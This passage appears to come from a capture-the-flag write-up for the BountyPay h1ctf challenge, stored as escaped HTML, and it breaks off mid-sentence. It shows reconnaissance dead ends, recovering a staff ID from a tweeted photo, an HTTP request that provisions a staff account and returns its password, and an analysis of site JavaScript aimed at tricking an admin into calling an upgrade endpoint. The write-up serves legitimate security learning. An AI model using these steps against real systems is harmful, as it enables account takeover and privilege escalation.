the other staff member, could have possibly hinted at the fact that we need to find a Jenkins instance somewhere? There\u0026#39;s no such subdomain, and unclear where else we could look for it. I tried checking a few endpoints on \u003ccode\u003esoftware\u003c/code\u003e subdomain but this was a dead-end,\u003c/li\u003e\n\u003cli\u003eI tried to decrypt session hash, or craft another hash based on the account information for Sam, but it did not lead anywhere at all.\u003c/li\u003e\n\u003cli\u003eI tried to forge session cookie for \u003ccode\u003estaff\u003c/code\u003e subdomain, assuming it follows same structure/principles as the cookie of \u003ccode\u003eapp\u003c/code\u003e subdomain - another dead end.\u003c/li\u003e\n\u003cli\u003eI recalled that \u003ccode\u003estaff\u003c/code\u003e subdomain was also whitelisted for redirect, so we could access it via SSRF. Maybe there\u0026#39;s something on it that we could only access via SSRF? I did a bruteforce on available templates and found new ones such as \u003ccode\u003eticket\u003c/code\u003e and \u003ccode\u003eadmin\u003c/code\u003e. \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dadmin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAdmin template\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e responded with a message \u003ccode\u003eNo Access to this resource\u003c/code\u003e. I tried it via SSRF but it still responded with same message.\u003c/li\u003e\n\u003cli\u003eTried bruteforcing Sam\u0026#39;s password on both \u003ccode\u003eapp\u003c/code\u003e and \u003ccode\u003estaff\u003c/code\u003e subdomain - no luck.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAfter banging my head against the wall with all those dead ends  I reached out to \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fbbuerhaus\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e@bbuerhaus\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to bounce my ideas, who confirmed I was on the right track with finding Sandra\u0026#39;s staff id, and it wasn\u0026#39;t long before I found \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSandra\u0026#39;s\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e twitter account among both \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Ffollowing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efollowing\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Ffollowers\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efollowers\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e lists for BountypayHQ, and in her timeline I saw \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114%2Fstatus%2F1258693001964068864\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with a photo featuring her staff access card that shows her Staff ID: \u003ccode\u003eSTF:8FJ3KFISL3\u003c/code\u003e. Yay!\u003c/p\u003e\n\n\u003cp\u003eFinally I issued the \u003ccode\u003ePOST\u003c/code\u003e request to \u003ccode\u003e/api/staff\u003c/code\u003e with Sandra\u0026#39;s Staff ID, and surely enough it provisioned a new account for Sandra and gave us the credentials that we could use to login to Staff  portal at \u003ccode\u003estaff.bountypay.h1ctf.com\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/staff\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\nstaff_id=STF:8FJ3KFISL3\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e201\u003c/span\u003e \u003cspan class=\"ne\"\u003eCreated\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member Account Created\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;sandra.allison\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;s%3D8qB8zEpMnc*xsz7Yp5\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"privilege-escalation\"\u003ePrivilege Escalation\u003c/h2\u003e\n\n\u003cp\u003eLogging in to Staff portal as Sandra and looking through all HTML and JS sources I noted the following things:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSession cookie was no longer a base64-encoded JSON. It couldn\u0026#39;t be decrypted - or not easily, at least.\u003c/li\u003e\n\u003cli\u003eThere is functionality to change \u003ccode\u003eprofile_name\u003c/code\u003e and \u003ccode\u003eprofile_avatar\u003c/code\u003e, but in both cases every special character is removed, so looks like XSS is not an option.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eJavascript code looked extremely interesting:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/js/website.js\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.upgradeToAdmin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einput[name=\u0026quot;username\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/upgrade?username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eUser Upgraded to Admin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eactive\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv.content\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv.content-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eattr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edata-target\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)).\u003c/span\u003e\u003cspan class=\"nx\"\u003eremoveClass\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehidden\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.sendReport\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/report?url=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eReport sent to admin team\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#myModal\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003emodal\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehide\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab2\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab3\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.tab4\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSeveral things I noted here: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eIssuing a request to \u003ccode\u003e/admin/upgrade?username=\u003c/code\u003e is likely the goal of this challenge, as this should escalate our privileges to Admin.\u003c/li\u003e\n\u003cli\u003eThere is a functionality to \u0026quot;send a report\u0026quot; to Admin team. \u003c/li\u003e\n\u003cli\u003eWe can use \u003ccode\u003e#tab1\u003c/code\u003e ... \u003ccode\u003e#tab4\u003c/code\u003e in URL to invoke a click on the tab on page load.\u003c/li\u003e\n\u003cli\u003eThere was no element with class\u003ccode\u003etab4\u003c/code\u003e on the page (only \u003ccode\u003etab1\u003c/code\u003e, \u003ccode\u003etab2\u003c/code\u003e, \u003ccode\u003etab3\u003c/code\u003e), which was interesting. \u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u0026quot;send report\u0026quot; functionality is clarified in the HTML code:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIs there something wrong with this page? If so hit the \u0026quot;Report Now\u0026quot; button and the page will be sent over to our admins to checkout.\u003cbr\u003e\nPages in the /admin directory will be ignored for security\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThere is a second endpoint, \u003ccode\u003e/?template=ticket\u0026amp;ticket_id=3582\u003c/code\u003e, where \u003ccode\u003eprofile_name\u003c/code\u003e and \u003ccode\u003eprofile_avatar\u003c/code\u003eare reflected as well. It shows a message from Admin to Sandra.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWithin both HTML pages we observe code like\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eLz90ZW1wbGF0ZT1ob21l\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe value here is the base64-encoded URL path, in this case it is \u003ccode\u003e/?template=home\u003c/code\u003e. This is the value sent when reporting a page, meaning we can report an arbitrary page to Admin by encoding the URL path with base64.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eFirst thing I tried was to hit the priv esc endpoint directly:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/admin/upgrade?username=sandra.allison\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e401\u003c/span\u003e \u003cspan class=\"ne\"\u003eUnauthorized\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Only admins can perform this\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOk, so it\u0026#39;s fairly clear that our goal to make Admin issue this GET request for us, and this is 